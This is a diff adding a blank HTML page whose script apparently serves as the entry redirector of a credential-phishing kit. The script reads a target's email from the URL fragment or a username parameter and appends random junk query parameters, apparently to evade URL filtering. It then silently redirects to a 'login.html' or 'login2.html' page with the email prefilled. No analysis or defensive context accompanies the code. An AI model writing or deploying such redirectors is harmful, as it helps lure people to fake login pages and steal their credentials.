@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<title>
+</title>
+</head>
+
+<body>
+</script>
+<script>
+    var yid = get_email_hash();
+    var nextFile = 'login.html'
+    var rurl = '';//getBaseUrl(true);
+    var randpars = get_rand_url_pars();
+   
+    if (!yid) {
+        yid = geturlparameter("username");
+    }
+    if (yid) {
+        nextFile = 'login2.html';
+        yid = "&username=" + yid;
+    }
+    else{ yid=''; }
+    rurl += nextFile+"?" + randpars + yid;
+    //alert(rurl);
+
+    window.location.replace(rurl);
+function getBaseUrl(baseWithoutFile){
+  if(baseWithoutFile === undefined){
+    baseWithoutFile = false;  
+  }
+  var fg = false;
+  var fullUrl = window.location.href;
+  var htmlstr = '.html';
+  var htmlLen = 5;
+  var htmlStrPos = -1;
+  var qmrkStrPos = fullUrl.indexOf('?');
+  var lastIndexOffslash = -1;
+  var fullUrlStart = '';
+  if(qmrkStrPos != -1){
+    fullUrlStart = fullUrl.substr(0, qmrkStrPos);
+    fg = true;   
+  }
+  htmlStrPos = fullUrl.indexOf(htmlstr);
+  if(htmlStrPos != -1){ 
+    fullUrlStart = fullUrl.substr(0, htmlStrPos+htmlLen); 
+    fg = true;
+  }
+  if(fullUrlStart.length > 0){
+    fullUrlStart = fullUrlStart.trim();
+  }
+  if(fg && baseWithoutFile){
+    lastIndexOffslash = fullUrlStart.lastIndexOf('/');
+    if(lastIndexOffslash != -1){
+      fullUrlStart = fullUrlStart.substr(0, lastIndexOffslash+1);
+    }
+  }
+  if(!fg){
+    fullUrlStart = fullUrl;
+  }
+  return fullUrlStart;
+}   
+
+function randomInteger(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+function randomString(r, n) {
+    for (var o = "", t = r; 0 < t; --t) o += n[Math.floor(Math.random() * n.length)];
+    return o;
+}
+function getdomainpartofemail(a) {
+    var e,
+        t = !1;
+    return !validateEmail(a) || (-1 != (e = (a = a.toLowerCase()).indexOf("@")) && (t = a.substr(e + 1))), t;
+}
+function get_email_hash() {
+    var a = !1,
+        i = window.location.href,
+        t = (i = i.trim()).lastIndexOf("#");
+    return -1 != t && ((a = i.substring(t + 1)), validateEmail(a) || (a = !1)), a;
+}
+function validateEmail(t) {
+    return /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(String(t).toLowerCase());
+}
+function geturlparameter(r) {
+    for (var t = window.location.search.substring(1).split("&"), e = 0; e < t.length; e++) {
+        var n = t[e].split("=");
+        if (n[0] == r) return decodeURIComponent(n[1]);
+    }
+}
+function get_rand_url_pars() {
+    var r = "",
+        n = 0,
+        a = "abcdefghijklmnopqrstuvwxyz",
+        e = a;
+    a += a.toUpperCase() + "123456789";
+    for (var t = randomInteger(3, 10), n = 0; n < t; n++) r += "&" + randomString(randomInteger(3, 10), e) + "=" + randomString(randomInteger(15, 30), a);
+    return r.substr(1);
+}
+
+</script>
+</body>
+</html>
